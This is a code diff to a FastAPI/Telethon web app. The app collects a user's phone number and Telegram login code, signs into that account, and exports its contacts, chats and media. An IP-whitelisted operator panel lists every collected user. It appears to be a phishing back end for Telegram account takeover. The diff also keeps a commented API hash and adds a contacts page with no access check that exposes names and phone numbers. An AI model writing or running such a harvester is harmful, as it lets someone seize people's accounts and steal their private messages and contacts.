@@ -4,7 +4,7 @@ from contextlib import asynccontextmanager
 
 import aiosqlite
 import uvicorn
-from fastapi import FastAPI, Request, Form
+from fastapi import FastAPI, Request, Form, Depends, status
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 from telethon import TelegramClient
@@ -12,8 +12,12 @@ from telethon.errors import SessionPasswordNeededError
 from fastapi.templating import Jinja2Templates
 from fastapi.staticfiles import StaticFiles
 from fastapi.responses import HTMLResponse, RedirectResponse
+from fastapi.exceptions import HTTPException
+from dotenv import load_dotenv
 from utils import update_user_data, export_user_chat_html_from_db
 from db import init_db, DB_FILE
+
+load_dotenv('.env')
 
 # API_ID = 23331207
 # API_HASH = "2d64092b8ecaded2ebb5ad25de96e222"
@@ -43,25 +47,21 @@ app = FastAPI(lifespan=lifespan)
 
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["*"],  # дозволити всі джерела
+    allow_origins=["*"],
     allow_credentials=True,
-    allow_methods=["*"],  # дозволити всі HTTP-методи
-    allow_headers=["*"],  # дозволити всі заголовки
+    allow_methods=["*"],
+    allow_headers=["*"]
 )
 
 session_name = "anon2"
-phone_number = None  # глобальна змінна
-# Словник для тимчасового зберігання сесій авторизації
+phone_number = None
 sessions = {}
 IS_AUTH = False
-AUTH_PASSWORD = 'qwerty'
+AUTH_PASSWORD = os.getenv('PASSWORD')
 
-
-
-# Монтую папку з користувачами і медіа як статичні файли
 app.mount("/users", StaticFiles(directory=USERS_FOLDER), name="users")
 
-templates = Jinja2Templates(directory="templates")  # створити цю папку
+templates = Jinja2Templates(directory="templates")
 
 class PhonePayload(BaseModel):
     phone: str
@@ -100,7 +100,6 @@ async def send_phone(data: PhonePayload):
 
 @app.post("/verify_code")
 async def verify_code(data: CodePayload):
-    # Знайдемо номер за кодом (в реалі потрібно покращити)
     phone_number = next((k for k,v in sessions.items() if "phone_code_hash" in v), None)
     if not phone_number:
         return {"error": "Send phone first."}
@@ -121,23 +120,55 @@ async def verify_code(data: CodePayload):
     try:
         me = await client.get_me()
         username = me.username or f"{me.first_name}_{me.id}"
-        # Назва папки з юзером і номером телефону
         folder_name = f"{username}_{phone_number.replace('+','')}"
         folder = os.path.join(USERS_FOLDER, folder_name)
         os.makedirs(folder, exist_ok=True)
-
-        # Запуск оновлення з пріоритетом (контакти, чати, медіа...)
         await update_user_data(client, me, folder)
 
     finally:
         await client.disconnect()
-        # Видаляємо сесію після успішного логіну
         sessions.pop(phone_number, None)
 
     return {"status": "ok"}
 
 
-@app.get("/login", response_class=HTMLResponse)
+@app.get("/user/{user_folder}/contacts", response_class=HTMLResponse)
+async def get_contacts(request: Request, user_folder: str):
+    async with aiosqlite.connect(DB_FILE) as db:
+        db.row_factory = aiosqlite.Row
+
+        async with db.execute(
+            "SELECT id FROM users WHERE username = ?", (user_folder,)
+        ) as cursor:
+            row = await cursor.fetchone()
+            if not row:
+                return HTMLResponse("User not found", status_code=404)
+            user_id = row["id"]
+
+        async with db.execute(
+            "SELECT tg_id, username, first_name, last_name, phone FROM contacts WHERE user_id = ?", (user_id,)
+        ) as cursor:
+            contacts = await cursor.fetchall()
+
+    return templates.TemplateResponse("contacts.html", {
+        "request": request,
+        "user_folder": user_folder,
+        "contacts": contacts
+    })
+
+
+def ip_whitelist(request: Request):
+    client_ip = request.client.host
+    if client_ip != os.getenv('ALLOWED_IP'):
+        raise HTTPException(
+            status_code=status.HTTP_403_FORBIDDEN,
+            detail="Access denied: IP not allowed",
+        )
+    return True
+
+
+
+@app.get("/login", response_class=HTMLResponse, dependencies=[Depends(ip_whitelist)])
 async def login_page(request: Request):
     return templates.TemplateResponse("password.html", {"request": request, "error": False})
 
@@ -151,7 +182,7 @@ async def login(request: Request, password: str = Form(...)):
     return templates.TemplateResponse("password.html", {"request": request, "error": True})
 
 
-@app.get("/users", response_class=HTMLResponse)
+@app.get("/users", response_class=HTMLResponse, dependencies=[Depends(ip_whitelist)])
 async def list_users(request: Request):
     if request.cookies.get("auth") != "ok":
         return RedirectResponse("/login")
@@ -164,15 +195,13 @@ async def list_users(request: Request):
                 users.append(name)
     return templates.TemplateResponse("users_list.html", {"request": request, "users": users})
 
-@app.get("/user/{user_folder}/chats", response_class=HTMLResponse)
+@app.get("/user/{user_folder}/chats", response_class=HTMLResponse, dependencies=[Depends(ip_whitelist)])
 async def user_chats(request: Request, user_folder: str):
     if request.cookies.get("auth") != "ok":
         return RedirectResponse("/login")
 
     async with aiosqlite.connect(DB_FILE) as db:
         db.row_factory = aiosqlite.Row
-
-        # отримати user_id
         async with db.execute(
             "SELECT id FROM users WHERE username = ?", (user_folder,)
         ) as cursor:
@@ -181,7 +210,6 @@ async def user_chats(request: Request, user_folder: str):
                 return HTMLResponse("User not found", status_code=404)
             user_id = row["id"]
 
-        # отримати чати
         async with db.execute(
             "SELECT id, chat_name FROM chats WHERE user_id = ?", (user_id,)
         ) as cursor:
@@ -194,7 +222,7 @@ async def user_chats(request: Request, user_folder: str):
     })
 
 
-@app.get("/user/{user_folder}/chats/{chat_id}", response_class=HTMLResponse)
+@app.get("/user/{user_folder}/chats/{chat_id}", response_class=HTMLResponse, dependencies=[Depends(ip_whitelist)])
 async def user_chat(request: Request, user_folder: str, chat_id: int):
     if request.cookies.get("auth") != "ok":
         return RedirectResponse("/login")
